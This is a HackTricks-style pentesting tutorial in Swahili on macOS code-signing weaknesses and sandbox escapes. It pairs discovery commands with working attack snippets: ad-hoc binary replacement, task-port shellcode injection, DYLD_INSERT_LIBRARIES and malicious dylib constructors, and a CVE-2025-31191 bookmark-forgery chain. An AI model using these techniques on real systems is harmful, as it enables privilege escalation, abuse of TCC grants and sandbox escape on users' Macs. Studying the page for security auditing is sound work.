# Udhaifu wa Code Signing wa macOS na Sandbox Escapes

{{#include ../../../banners/hacktricks-training.md}}

## Ad-Hoc Signed Binaries

### Maelezo ya Msingi

**Ad-hoc signing** (`CS_ADHOC`) huunda code signature yenye **no certificate chain**. Bado huhash code iliyosainiwa, hivyo validation inaweza kugundua modification, lakini haitoi developer identity ambayo component nyingine inaweza ku-authenticate. Kubadilisha na kusaini tena executable huzalisha CodeDirectory/CDHash tofauti.<sup>[[1]](#references)[[4]](#references)</sup>

Kwenye Apple Silicon Macs, executable zote zinahitaji angalau ad-hoc signature. Hii inamaanisha utapata ad-hoc signatures kwenye development tools nyingi, Homebrew packages, na third-party utilities.

### Kwa Nini Hili Ni Muhimu

- **Hakuna verifiable signer identity** — checks zinazokubali path pekee, ad-hoc status, au identifier isiyopinned haziwezi kubaini ni nani aliyetengeneza binary.
- Third-party ad-hoc binaries zilizo kwenye **privileged positions** (FDA, daemons, helpers) ni targets zenye kipaumbele cha juu wakati file au parent directory yake inaweza kuandikwa.
- CDHash, designated-requirement, au requirement-backed TCC check **hugundua** replacement. Path-based policy huenda isigundue; kagua requirement halisi na ujaribu tena grant badala ya kudhani kwamba itaendelea kufanya kazi baada ya re-signing.

### Ugunduzi
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attack: Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. Relaunch and verify the effective grant. It survives only when the
#    authorization is path-based (or otherwise does not pin the old CDHash).
```
---

## Michakato Inayoweza Kuwekwa Debug (get-task-allow)

### Maelezo ya Msingi

Entitlement ya **`com.apple.security.get-task-allow`** (au flag ya **`CS_GET_TASK_ALLOW`**) humruhusu debugger aliyeidhinishwa kupata task port ya mchakato hata wakati Hardened Runtime kwa kawaida ingezuia hilo. Debugger aliyefaulu anaweza kusoma memory, kurekebisha registers, kuingiza code, na kudhibiti utekelezaji.<sup>[[3]](#references)</sup>

Hii imekusudiwa **kwa build za development pekee**. Hata hivyo, baadhi ya binaries za third-party husafirishwa zikiwa na entitlement hii katika production.

> [!CAUTION]
> Binary ya production iliyo na `get-task-allow` ni primitive yenye nguvu ya exploitation. `taskgated`, utambulisho wa caller, sandboxing, debugger entitlements, na uidhinishaji wa Developer Tools bado huathiri ikiwa client fulani inaweza kupata task port; fanya majaribio kwa kutumia `lldb`/`debugserver` pamoja na injector inayokusudiwa. Mara attachment inapofaulu, code iliyoingizwa huendeshwa ikiwa na entitlements, TCC grants, na security context za target.

### Ugunduzi
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Hakuna Uthibitishaji wa Library + Mazingira ya DYLD

### Kufuta Runtime Library-Validation

Entitlement ya faragha **`com.apple.private.security.clear-library-validation`** haizimi library validation wakati wa kuanzisha process. Badala yake, inaruhusu process kuita `csops(..., CS_OPS_CLEAR_LV, ...)` yenyewe wakati wa runtime. XNU kisha hufuta `CS_REQUIRE_LV | CS_FORCED_LV`, mradi caller ana entitlement hiyo na anakidhi ukaguzi wa ziada wa handler. Kwa hiyo, process inaweza kuwa target inayofaa ya library-injection baada tu ya kufikia code path inayofuta library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### Mchanganyiko Hatari

Binary inapokuwa na **zote mbili**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (hupakia dylib yoyote)
- `com.apple.security.cs.allow-dyld-environment-variables` (inakubali DYLD env vars)

Huu ni mchanganyiko wa thamani kubwa kwa code-injection kwa sababu Hardened Runtime inaruhusu library isiyoaminika pamoja na DYLD environment variable. Launch context bado inaweza kusafisha DYLD variables (kwa mfano, protected au privileged execution paths), kwa hiyo thibitisha invocation halisi badala ya kuchukulia entitlement pair hii kuwa inafanya kazi bila masharti.

### Ugunduzi
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Shambulio: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Temporary Exceptions za Sandbox

### Jinsi Zinavyodhoofisha Sandbox

Sandbox temporary exceptions (`com.apple.security.temporary-exception.*`) hufungua mianya katika App Sandbox:<sup>[[2]](#references)</sup>

| Exception | Inaruhusu Nini |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Kuunganisha kwenye huduma za XPC/Mach za mfumo mzima |
| `temporary-exception.files.absolute-path.read-write` | Kusoma/kuandika mafaili yaliyo nje ya app container |
| `temporary-exception.iokit-user-client-class` | Kufungua miunganisho ya IOKit user-client |
| `temporary-exception.shared-preference.read-only` | Kusoma preferences za apps nyingine |
| `temporary-exception.files.home-relative-path.read-write` | Kufikia paths zinazohusiana na `~` |

### Mach-Lookup Exceptions = Primitive ya Sandbox Escape

Exception hatari zaidi ni **mach-lookup** — inaruhusu app iliyo kwenye sandbox kuwasiliana na daemons zenye privileges:
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Shambulio: Sandbox Escape kupitia Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Ukaguzi wa Code-Signing Si Uadilifu wa Mteja wa XPC

Huduma ya XPC inaweza kuthibitisha connection kwa kutoa hali ya code-signing kutoka kwenye audit token yake na kukubali **platform binary** ya Apple au client yenye `CS_REQUIRE_LV`/`CS_FORCED_LV`. Majaribio haya yanaelezea executable na process flags zilizochaguliwa; hayathibitishi kwamba address space ya sasa ina code inayoaminika pekee. Utafiti dhidi ya huduma za ImageCapture ulionyesha kwamba Apple binary inayoweza kuingiziwa code, kama vile `/bin/ls`, inaweza kupakia attacker dylib kupitia `DYLD_INSERT_LIBRARIES` na kisha kuunganisha kama platform client. Ukaguzi wa kufuatilia library-validation flags pia ulipitishwa kabla Apple haijabadilisha huduma hiyo ili ihitaji private authorization entitlement yake katika macOS 15.<sup>[[6]](#references)</sup>

### Offensive Audit Workflow

1. Reverse `listener:shouldAcceptNewConnection:` (au XPC handler ya kiwango cha chini inayolingana) na tambua maamuzi yanayotegemea tu `isPlatformBinary`, `kSecCodeInfoFlags`, `CS_PLATFORM_BINARY`, `CS_REQUIRE_LV`, au `CS_FORCED_LV`.
2. Orodhesha Apple-signed clients zinazoweza kuwasiliana kwa kutumia protocol hiyo, kisha kagua Hardened Runtime na entitlements. Platform signature pekee si ushahidi kwamba DYLD injection imezuiwa.
3. Test candidate kwenye **target macOS build**. Ikiwa constructor dylib inapakiwa, anzisha service connection kutoka kwenye constructor hiyo ili audit token ihusiane na platform process iliyokubaliwa.
4. Rudia test kwa kila vendor patch: kuongeza process-status flag nyingine inayoweza kubadilishwa kwenye uamuzi huohuo wa authorization kunaweza kutoondoa confused-deputy primitive.
```bash
# Static triage of the intended client
codesign -dv --verbose=4 /bin/ls 2>&1 | grep -E 'flags=|Runtime Version|TeamIdentifier'
codesign -d --entitlements :- /bin/ls 2>/dev/null | plutil -p -

# Dynamic check using the constructor dylib created earlier in this page
DYLD_PRINT_LIBRARIES=1 DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /bin/ls
```
> [!NOTE]
> Tabia ya DYLD, policy ya AMFI, na ukaguzi wa upande wa service hubadilika kati ya matoleo ya macOS. Kushindwa dhidi ya host iliyopata patches zote hakuthibitishi kwamba chain hiyo hiyo ilishindwa kwenye toleo lililo katika mazingira hatarishi.

---

## Security-Scoped Bookmark Forgery (CVE-2025-31191)

Security-scoped bookmarks huhifadhi chaguo la faili la mtumiaji kati ya uzinduzi wa programu. Sandbox extension hufungwa na boot, hivyo `ScopedBookmarkAgent` huihalalisha na kuunda bookmark ya muda mrefu iliyothibitishwa kwa HMAC; programu inapowasilisha bookmark hiyo baadaye, agent huihalalisha na kutoa sandbox extension mpya. Signing secret huhifadhiwa kwenye login keychain, na per-app key hutengenezwa kwa kutumia bundle identifier.<sup>[[7]](#references)</sup>

Kwenye mifumo iliyoathirika, keychain ACL ilizuia process isiyoaminika **kusoma** secret ya `com.apple.scopedbookmarksagent.xpc`, lakini haikuzuia kufutwa kwake. Programu ya sandbox iliyoathirika ingeweza kubadilisha item hiyo na secret inayojulikana pamoja na ACL inayodhibitiwa na attacker, kutengeneza app-specific HMAC key, kughushi entries kwenye bookmark plist ya writable container, na kuiomba `ScopedBookmarkAgent` izibadilishe kuwa file-access extensions. Hii ilifanya kila sandboxed application inayotumia security-scoped bookmarks kuwa sandbox escape inayoweza kupata arbitrary file access, bila kuhitaji file-picker interaction ya ziada. Apple ilirekebisha tatizo hili kwenye security updates za Machi 31, 2025.<sup>[[7]](#references)</sup>

### Triage na Attack Chain
```bash
APP=/Applications/Target.app
BIN="$APP/Contents/MacOS/$(/usr/libexec/PlistBuddy -c 'Print :CFBundleExecutable' \
"$APP/Contents/Info.plist")"

# Identify apps that can persist app- or document-scoped file access
codesign -d --entitlements :- "$BIN" 2>/dev/null | plutil -p - | \
grep -E 'com.apple.security.files.bookmarks.(app|document)-scope'

# Locate app-managed bookmark stores; names and schemas are application-specific
find "$HOME/Library/Containers" -type f \
\( -iname '*securebookmark*.plist' -o -iname '*securebookmarks*.plist' \) 2>/dev/null

# Inspect metadata for the agent's generic-password item (normally not its secret)
security find-generic-password -s com.apple.scopedbookmarksagent.xpc
```
Mfuatano wa exploitation kwenye host iliyo hatarini ni:

1. Pata code execution ndani ya app iliyo kwenye sandbox inayotumia persistent scoped bookmarks.
2. Badilisha keychain signing item ya agent kwa secret inayojulikana na ACL inayoruhusu zaidi.
3. Kokotoa `HMAC-SHA256(key=known_secret, data=bundle_id)` na forge bookmark ya path muhimu katika bookmark store inayoweza kuandikwa na app.
4. Anzisha njia ya kawaida ya application ya bookmark-resolution ili `ScopedBookmarkAgent` irejeshe sandbox extension.
5. Tumia file access mpya ku-overwrite execution au data target iliyo nje ya sandbox ambayo inapatikana kwa user huyo.

Hii ni **technique ya patched-version**: itumie kuelewa trust boundary na kutathmini systems ambazo hazijafanyiwa patch, si kama dhana kuhusu releases za sasa. Kwa testing ya sasa, lenga bookmark parsing, identity binding, keychain-item lifecycle, na tabia ya confused-deputy inayohusiana na agent.

---

## Entitlements za Apple za Kibinafsi

### Ni Nini

Entitlements zenye kiambishi `com.apple.private.*` hutoa access kwa **Apple-internal APIs** ambazo hazijaandikwa kwenye documentation au hazipatikani kwa third-party developers. Third-party binaries zenye private entitlements huzipata kupitia enterprise cert, MDM, au usambazaji usio wa App Store.

### Private Entitlements Hatarishi

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Usomaji/uandishi kamili wa TCC database |
| `com.apple.private.tcc.allow` | Access kwa TCC services mahususi |
| `com.apple.private.security.no-sandbox` | Kuendesha bila sandbox |
| `com.apple.private.iokit` | Direct IOKit driver access |
| `com.apple.private.kernel.\*` | Kernel interface access |
| `com.apple.private.xpc.launchd.job-label` | Kusajili/kudhibiti launchd jobs |
| `com.apple.rootless.install` | Kuandika kwenye paths zilizolindwa na SIP |

### Discovery
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Custom Sandbox Profiles (SBPL)

### Hivi Vilivyo

Binaries zinaweza kujumuisha **custom sandbox profiles** zilizoandikwa kwa SBPL (Seatbelt Profile Language). Profiles hizi zinaweza kuwa na vizuizi zaidi AU **kuwa zenye ruhusa zaidi** kuliko App Sandbox ya kawaida.

### Kukagua Custom Profiles
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Njia za Maktaba Zinazoweza Kuandikwa

### Ni Nini

Binary inapopakia dynamic library kutoka kwenye path ambayo mtumiaji wa sasa anaweza **kuandikia**, library hiyo inaweza kubadilishwa na code hasidi.

### Ugunduzi
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Shambulio: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Mwongozo wa Code Signing](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Entitlements](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (operesheni za `CS_OPS_*` na `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (handler ya `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
- [6] [Enzi Mpya ya macOS Sandbox Escapes: Kuchunguza Attack Surface Iliyopuuzwa na Kugundua Vulnerabilities Mpya Zaidi ya 10](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [7] [Kuchanganua CVE-2025-31191: macOS security-scoped bookmarks-based sandbox escape](https://www.microsoft.com/en-us/security/blog/2025/05/01/analyzing-cve-2025-31191-a-macos-security-scoped-bookmarks-based-sandbox-escape/)
{{#include ../../../banners/hacktricks-training.md}}
